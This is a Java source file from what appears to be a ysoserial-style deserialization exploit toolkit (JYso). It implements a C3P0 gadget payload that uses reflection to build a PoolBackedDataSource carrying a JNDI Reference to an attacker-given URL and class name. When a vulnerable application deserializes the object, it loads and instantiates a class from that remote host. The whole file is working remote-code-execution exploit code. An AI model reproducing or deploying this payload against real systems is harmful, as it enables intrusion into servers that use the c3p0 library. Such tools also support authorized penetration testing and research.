package com.qi4l.JYso.gadgets;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Reflections;

import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.util.logging.Logger;

/**
 * com.sun.jndi.rmi.registry.RegistryContext->lookup
 * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
 * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
 * <p>
 * Arguments:
 * - base_url:classname
 * <p>
 * Yields:
 * - Instantiation of remotely loaded class
 *
 * @author mbechler
 */

@SuppressWarnings({"unused"})
@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11"})
@Authors({Authors.MBECHLER})
public class C3P0 implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception {

        int sep = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);

        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        return b;
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private final String className;

        private final String url;

        public PoolSource(String className, String url) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference() {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter() {
            return null;
        }

        public void setLogWriter(PrintWriter out) {
        }

        public int getLoginTimeout() {
            return 0;
        }

        public void setLoginTimeout(int seconds) {
        }

        public Logger getParentLogger() {
            return null;
        }

        public PooledConnection getPooledConnection() {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) {
            return null;
        }

    }
}
